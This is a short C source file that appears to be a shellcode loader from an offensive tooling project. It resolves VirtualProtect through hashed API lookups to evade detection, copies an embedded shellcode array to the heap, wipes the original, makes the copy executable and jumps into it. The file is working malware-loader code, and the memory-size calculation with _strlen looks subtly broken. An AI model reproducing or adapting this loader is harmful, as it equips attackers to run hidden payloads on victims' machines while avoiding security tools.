#include "shellcode.h"
#include "../src_common/common.h"
#include "mini_stdlib.h"

#pragma GCC diagnostic ignored "-Wpointer-to-int-cast"
#pragma GCC diagnostic ignored "-Wint-to-pointer-cast"


int Execute(){
	tVirtualProtect  _VirtualProtect = (tVirtualProtect)getFunctionPtr(H_LIB_KERNEL32, H_API_VIRTUALPROTECT);

	PVOID not_exec_mem = _malloc(sizeof(shellcode));		/* Alloc memory for copy shellcode there */
	memcpy(not_exec_mem, shellcode, sizeof(shellcode));	/* Copy shellcode to allocated memoty */
	_memset(shellcode, 0, sizeof(shellcode));			/* Fill shellcode arr with zeros */

	char arg_to_pass[] = {'z','e','s','t', 0x00};

	DWORD oldProtect;
	_VirtualProtect (not_exec_mem, _strlen(not_exec_mem), PAGE_EXECUTE, &oldProtect);
		void (*func)();
		func = (void (*)()) not_exec_mem;
		func(arg_to_pass);
	_VirtualProtect (not_exec_mem, _strlen(not_exec_mem), oldProtect, &oldProtect);
	return 0;
}
